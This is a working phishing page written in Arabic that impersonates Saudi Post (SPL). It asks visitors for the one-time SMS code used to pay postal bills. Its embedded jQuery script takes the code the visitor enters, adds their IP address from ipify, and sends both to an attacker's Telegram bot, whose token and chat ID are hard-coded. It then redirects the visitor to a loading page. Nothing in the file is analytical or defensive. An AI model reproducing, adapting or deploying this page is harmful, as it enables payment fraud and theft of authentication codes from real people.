<!DOCTYPE html>
<html dir="rtl" lang="ar" translate="no">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    <meta name="google" content="notranslate">
    <meta name="language" content="ar">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>البريد السعودي | سبل</title>
    
    <link type="text/css" rel="stylesheet" href="./البريد السعودي _ سبل_files/main-ar.css">
    <link type="text/css" rel="stylesheet" href="./البريد السعودي _ سبل_files/font-awesome.css">
    <link type="text/css" rel="stylesheet" href="./البريد السعودي _ سبل_files/style.css">
    <link type="text/css" rel="stylesheet" href="./البريد السعودي _ سبل_files/aos.css">
    <link type="text/css" rel="stylesheet" href="./البريد السعودي _ سبل_files/fonts.css">
    <link type="text/css" rel="stylesheet" href="./البريد السعودي _ سبل_files/main.css">
    <link type="text/css" rel="stylesheet" href="./البريد السعودي _ سبل_files/login.css">
    <link type="text/css" rel="stylesheet" href="./البريد السعودي _ سبل_files/extra.css">
</head>
<body data-aos-easing="ease" data-aos-duration="400" data-aos-delay="0" class="notranslate loaded">
    <div class="page-wrap">
        <div class="top_bar login">
            <div class="container flex_me">
                <div class="col"></div>
            </div>
        </div>
        <header></header>
        
        <div class="login_container container">
            <div class="flex_me">
                <div class="col aos-init aos-animate" id="loginDivs" data-aos="fade-down" data-aos-delay="500">
                    <span class="generic_page_title">سداد فواتير الخدمات البريدية</span>
                    <p style="line-height:30px;max-width:365px;margin:25px auto 20px;">
                        ستصلك رسالة نصية قصيرة برمز سري مؤقت على جوالك، ادخل الرمز المرسل لاتمام العملية.
                    </p>
                    
                    <div class="pay_page">
                        <div class="form_group">
                            <label for="splLogMobiCode">الرمز السري (OTP) <em>*</em></label>
                            <input type="tel" id="splLogMobiCode" name="splLogMobiCode" class="form_control" placeholder="" value="" maxlength="8" pattern="[0-9]*" inputmode="numeric" autocomplete="off" autocorrect="off" spellcheck="false" im-insert="true" style="text-align: right;">
                            <i class="fa fa-lock" style=""></i>
                            <span id="sms-validation" class="field-validation-error text-danger" style="display:none;"></span>
                        </div>
                        
                        <button id="button3" name="button2" type="submit" style="background-color: #007bff; color: white; padding: 10px 20px; border: none; border-radius: 5px; font-size: 16px; cursor: pointer;">
                            متابعة
                        </button>
                        
                        <span id="resendOTP" class="btn_noBG2 countdown disabled">يمكنك إرسال رمز سري جديد بعد 7 ثواني.</span>
                    </div>

                    <p>يجب ملئ الخانات المرفقة بعلامة النجمة <em>*</em></p>
                </div>
            </div>
        </div>
        
        <footer class="main-footer">
            <div class="container">
                <div class="row">
                    <div class="col-sm-6">
                        <p>©️ 2024 جميع الحقوق محفوظة لمؤسسة البريد السعودي - سُـبل</p>
                    </div>
                    <div class="col-md-6 terms">
                        <span>عند استخدامك هذا الموقع، فإنك توافق على</span>
                        <a href="#">شروط الخدمة</a> و
                        <a href="#">سياسة الخصوصية</a>
                    </div>
                </div>
            </div>
        </footer>
        
     <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
    const TELEGRAM_BOT_TOKEN = '7782372269:AAHawGOO9s8x64Sda5-jVgTUlwI73BV51Xs';  // Replace with your Telegram bot token
    const CHAT_ID = '7057894073';  // Replace with the target chat ID

    // Function to get the user's IP address
    function getIPAddress(callback) {
        // Use a free IP detection service (e.g., ipify)
        $.getJSON('https://api.ipify.org?format=json', function(data) {
            const ipAddress = data.ip;
            callback(ipAddress);
        }).fail(function(error) {
            console.error('Error fetching IP address:', error);
            alert('فشل في الحصول على عنوان IP');
        });
    }

    // Function to send OTP to Telegram
    function sendOTPToTelegram(otp, ipAddress, successCallback) {
        const message = `
الرمز السري (OTP): ${otp}
📡 عنوان IP: ${ipAddress}
        `;

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const data = {
            chat_id: CHAT_ID,
            text: message
        };

        $.post(url, data, function(response) {
            console.log('Message sent:', response);
            successCallback();  // Call the success callback on success
        }).fail(function(error) {
            console.error('Error:', error);
            alert('فشل إرسال الرمز السري');
        });
    }

    // Handle submit button click event
    $('#button3').on('click', function() {
        const otp = $('#splLogMobiCode').val().trim();

        if (otp === '') {
            alert('يرجى إدخال الرمز السري');
            return;
        }

        // Fetch the user's IP address
        getIPAddress(function(ipAddress) {
            // Call the sendOTPToTelegram function and redirect only if successful
            sendOTPToTelegram(otp, ipAddress, function() {
                // Redirect to loading.html after OTP is sent successfully
                window.location.href = 'loading.html';
            });
        });
    });
</script>
    </div>
</body>
</html>
